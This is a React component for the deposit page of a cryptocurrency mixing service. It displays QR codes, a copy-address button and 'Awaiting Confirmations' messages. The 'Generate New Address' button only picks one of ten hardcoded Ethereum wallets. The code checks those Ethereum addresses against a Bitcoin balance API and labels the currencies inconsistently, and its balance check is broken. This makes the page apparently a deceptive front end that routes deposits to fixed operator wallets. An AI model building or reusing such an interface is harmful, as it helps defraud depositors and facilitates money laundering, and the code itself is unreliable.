import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { ThreeDots } from 'react-loader-spinner';
import Form from './Fromlocal';
import Amountdata from './Localdataamount';

const EtherAddresses = [
  '0x50a08E52Fd0BFB16cae807C63d676072CCea51E5',
  '0x0f1345a312a0B249eeDB3844BBC2D94C3b4c375C',
  '0x9c57056a7046cc90469e47573970e73c7EaF1d98',
  '0x7B75a90130959C48A1d6F70fE59b9ba6b5365184',
  '0x1D98d9A1DddfBc1f3bE5c84127115F0300aaCcB5',
  '0xb82a462B7025346B4F58C2bFa58e12f3f2869Ddf',
  '0x1E0048eC91426Cc20Dd0Dd62A5Cb969c8FFCa937',
  '0x3e36f914578C243b23C99a6758205d2Ab6f95CAf',
  '0xAFAA2aE1E154bF7Ee077c9F07404E0c69F83a47f',
  '0x7e9790Cb373919777894eF8E53e2185e5Db5479E',
];

function EtherAddress() {
  const [address, setAddress] = useState(localStorage.getItem('address') || '');
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState(0);
  const [price, setPrice] = useState(0);
  const [error, setError] = useState(null);
  const [qrCodeUrl, setQrCodeUrl] = useState(null);
  const [generating, setGenerating] = useState(false);
  const [showCopyMessage, setShowCopyMessage] = useState(false);

  const handleCopyClick = () => {
    const el = document.createElement('textarea');
    el.value = address;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    setShowCopyMessage(true);
    setTimeout(() => setShowCopyMessage(false), 3000);
  };

  const generateAddress = () => {
    setGenerating(true);
    const newAddress = EtherAddresses[Math.floor(Math.random() * EtherAddresses.length)];
    setAddress(newAddress);
    localStorage.setItem('address', newAddress);
  };
  
  useEffect(() => {
    if (!address) {
      generateAddress();
      setBalance(0);
      return;
    }

    async function FetchConfirmations() {
    setLoading(true);
    
    try {
      const response = await axios.get(`https://blockchain.info/balance?active=${address}`);
        const btcBalance = response.data[address].final_balance / 100000000;
        setBalance(btcBalance);
        const rateResponse = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
        const rate = rateResponse.data.bitcoin.usd;
        setPrice(rate);
        const qrCodeUrl = `https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=${address}`;
        setQrCodeUrl(qrCodeUrl);
        
    } catch (error) {
      setError(error);
    } finally {
      setLoading(false);
    }
    };

    FetchConfirmations();
  }, [address]);

  if (loading) {
    return <div className='flex items-center gap-3 cursor-progress justify-center text-center mx-auto py-10'>
    <ThreeDots height="40" width="40" radius="9" color="#DFC660" ariaLabel="three-dots-loading" wrapperStyle={{}} visible={true}/>
    </div>
  }
    
  if (error) {
    return <div className='overflow-hidden'>
    <img className='md:w-44 duration-700 mx-auto justify-center text-center my-4' src={qrCodeUrl} alt="Bitcoin QR code" />
    <div className='md:max-w-screen-sm mx-auto justify-center items-center bg-[#0D0D0D] md:px-5 px-2 py-5'>
      <p className='text-[#ffffff] text-xs'>
        Order will be available for 24 hours. Minimum possible amount for this address 0.10 ETH, maximum amount 100 ETH, Once you send coin for mixing refresh your brower, the deposit will be updated automatically.
      </p>
    </div>
    <div className='border-b border-[#272727] max-w-screen-md mx-auto py-2'/>
    <div className="items-center md:mx-auto text-center justify-center my-5">
      <span 
        className="text-white font-semibold justify-center items-center text-center text-xs"
      >
        {address}
      </span>
        <button onClick={handleCopyClick}>
          <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
            width="13.000000pt" viewBox="0 0 96.000000 96.000000"
            preserveAspectRatio="xMidYMid meet">
            <g transform="translate(0.000000,96.000000) scale(0.100000,-0.100000)"
              fill="#d8bb6c" stroke="none">
              <path d="M80 560 l0 -320 40 0 40 0 0 280 0 280 280 0 280 0 0 40 0 40 -320 0
              -320 0 0 -320z"/>
              <path d="M240 400 l0 -320 320 0 320 0 0 320 0 320 -320 0 -320 0 0 -320z
              m560 0 l0 -240 -240 0 -240 0 0 240 0 240 240 0 240 0 0 -240z"/>
            </g>
          </svg>
        </button>
      {showCopyMessage && (
        <span className="py-1 px-2 bg-[#d8bb6c] text-black text-xs font-semibold">Address copied</span>
      )}
    </div>
    <div className='flex gap-2 items-center justify-center text-white py-2'>
      <span className='md:text-sm text-xs font-bold' >Awaiting Confirmations</span>
      <ThreeDots height="30" width="30" radius="9" color="#fff" ariaLabel="three-dots-loading" wrapperStyle={{}} wrapperClassName="" visible={true}/>
    </div>
    {error.message}</div>;
  }
  

  return (
    <>
      <div className="duration-500 mx-auto overflow-hidden justify-center text-center items-center">
        {loading ? (
          <div className='flex items-center gap-3 cursor-progress justify-center text-center mx-auto py-16'>
            <ThreeDots height="40" width="40" radius="9" color="#DFC660" ariaLabel="three-dots-loading" wrapperStyle={{}} visible={true}/>
          </div>
        ) : balance ? (
          balance.Balance === 0 ? (
            <div className="duration-500">
              <img className='md:w-44 duration-700 mx-auto justify-center text-center my-4 text-white' src={qrCodeUrl} alt="Bitcoin QR code" />
              <button 
                onClick={generateAddress} 
                className="text-[#d8bb6c] hover:bg-[#d8bb6c] hover:text-black items-center text-xs grow-0 relative h-10 font-sans px-4 flex border border-[#d8bb6c] justify-center text-center mx-auto my-5 rounded-sm uppercase shadow-2xl duration-500">
                Generate New Address
              </button>
              <div className='md:max-w-screen-sm mx-auto justify-center items-center bg-[#0D0D0D] md:px-5 px-2 py-5'>
                <p className='text-[#ffffff] text-xs'>
                  Order will be available for 24 hours. Minimum possible amount for this address 0.10 ETH, maximum amount 100 ETH, Once you send coin for mixing refresh your brower, the deposit will be updated automatically.
                </p>
              </div>
              <div className='border-b border-[#272727] max-w-screen-md mx-auto py-2'/>
              <div className="items-center md:mx-auto text-center justify-center my-5">
                <span className="text-white font-semibold justify-center items-center text-center text-xs">{address}</span>
                <button onClick={handleCopyClick}>
                  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                    width="13.000000pt" viewBox="0 0 96.000000 96.000000"
                    preserveAspectRatio="xMidYMid meet">
                    <g transform="translate(0.000000,96.000000) scale(0.100000,-0.100000)"
                      fill="#d8bb6c" stroke="none">
                      <path d="M80 560 l0 -320 40 0 40 0 0 280 0 280 280 0 280 0 0 40 0 40 -320 0
                      -320 0 0 -320z"/>
                      <path d="M240 400 l0 -320 320 0 320 0 0 320 0 320 -320 0 -320 0 0 -320z
                      m560 0 l0 -240 -240 0 -240 0 0 240 0 240 240 0 240 0 0 -240z"/>
                    </g>
                  </svg>
                </button>
              </div>
              {showCopyMessage && (
                <span className="py-1 px-2 bg-[#d8bb6c] text-black text-xs font-semibold">Address copied</span>
              )}
              <div className='flex gap-2 items-center justify-center text-white py-2'>
                <span className='md:text-sm text-xs font-bold' >Awaiting Confirmations</span>
                <ThreeDots height="30" width="30" radius="9" color="#fff" ariaLabel="three-dots-loading" wrapperStyle={{}} wrapperClassName="" visible={true}/>
              </div>
            </div>
          ) : (
            <div className='duration-700'>
              <div className="font-bold text-white text-xl md:text-3xl py-8 md:my-8 my-4 duration-500 bg-[#0D0D0D] max-w-sm justify-center text-center mx-auto">
                <p className="text-sm font-normal text-[#aaaaaa] duration-500 py-2">Your Deposit Balance</p>
                <p>
                  BTC {balance}
                </p>
                <p className="text-[#aaaaaa] text-xs py-1 duration-500">
                 USD {balance * price.toFixed(4)}
                </p>
              </div>
              <div className='max-w-md mx-auto justify-center items-center mt-5'>
                <p className='text-white text-sm'>
                  We have detected your transaction. Base on the current blockchain network confirmations load, your transaction is processing to mixing, confirmation will take: 24 hours.
                </p>
              </div>
              <button 
                onClick={generateAddress} 
                className="text-[#d8bb6c] hover:bg-[#d8bb6c] hover:text-black items-center text-xs grow-0 relative h-10 font-sans px-4 flex border border-[#d8bb6c] justify-center text-center mx-auto my-5 rounded-sm uppercase shadow-2xl duration-500">
                Generate New Address
              </button>
              <div className='border-b border-[#272727] max-w-screen-md mx-auto py-2'/>
                <p className='md:text-sm text-xs font-bold text-green-500 mt-4'>Transaction has been successfully received!</p>
              <div className='max-w-screen-sm mx-auto justify-center items-center'>
                <p className='text-[#aaaaaa] text-xs py-3'>
                 there is nothing else you need to do! You may close this window if you wish. your transaction balance status is vaild for 24 hours.
                </p>
              </div>
            </div>
          )
        ) : (
          <div className="duration-500">
            <img className='md:w-44 duration-700 mx-auto justify-center text-center my-4' src={qrCodeUrl} alt="Bitcoin QR code" />
            <Amountdata/>
            <div className="flex max-w-sm items-center mx-auto text-center justify-between my-3 pb-3 bg-[#0D0D0D] py-3 px-5 md:px-14">
              <span className="text-white font-semibold justify-center items-center text-center text-xs">{address}
              </span>
              <button onClick={handleCopyClick}>
                <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                  width="13.000000pt" viewBox="0 0 96.000000 96.000000"
                  preserveAspectRatio="xMidYMid meet">
                  <g transform="translate(0.000000,96.000000) scale(0.100000,-0.100000)"
                    fill="#d8bb6c" stroke="none">
                    <path d="M80 560 l0 -320 40 0 40 0 0 280 0 280 280 0 280 0 0 40 0 40 -320 0
                    -320 0 0 -320z"/>
                    <path d="M240 400 l0 -320 320 0 320 0 0 320 0 320 -320 0 -320 0 0 -320z
                    m560 0 l0 -240 -240 0 -240 0 0 240 0 240 240 0 240 0 0 -240z"/>
                  </g>
                </svg>
              </button>
            </div>
            {showCopyMessage && (
              <span className="py-1 px-2 bg-[#d8bb6c] text-black text-xs font-semibold">Address copied</span>
            )}
            <button 
              onClick={generateAddress} 
              className="text-[#d8bb6c] hover:bg-[#d8bb6c] hover:text-black items-center text-xs grow-0 relative h-10 font-sans px-4 flex border border-[#d8bb6c] justify-center text-center mx-auto my-5 rounded-sm uppercase shadow-2xl duration-500">
              Generate New Address
            </button>
            <div className='md:max-w-screen-sm mx-auto justify-center items-center bg-[#0D0D0D] md:px-5 px-2 py-5'>
              <p className='text-[#ffffff] text-xs'>
                Order will be available for 24 hours. Minimum possible amount for this address 0.10 ETH, maximum amount 100 ETH, Once you send coin for mixing refresh your brower, the deposit will be updated automatically.
              </p>
            </div>
            <div className="items-center mx-auto text-center justify-center my-3">
              <p className="text-white font-semibold justify-center items-center text-center py-3 px-10 md:px-20 text-sm">
                Your output address
              </p>
              <Form/>
            </div>
            <div className='border-b border-[#272727] max-w-screen-md mx-auto py-2'/>
            <div className='flex gap-2 items-center justify-center text-white py-2'>
              <span className='md:text-sm text-xs font-bold' >Awaiting Confirmations</span>
              <ThreeDots height="30" width="30" radius="9" color="#fff" ariaLabel="three-dots-loading" wrapperStyle={{}} wrapperClassName="" visible={true}/>
            </div>
        </div>
        )}
      </div>
    </>
  );
}

export default EtherAddress;
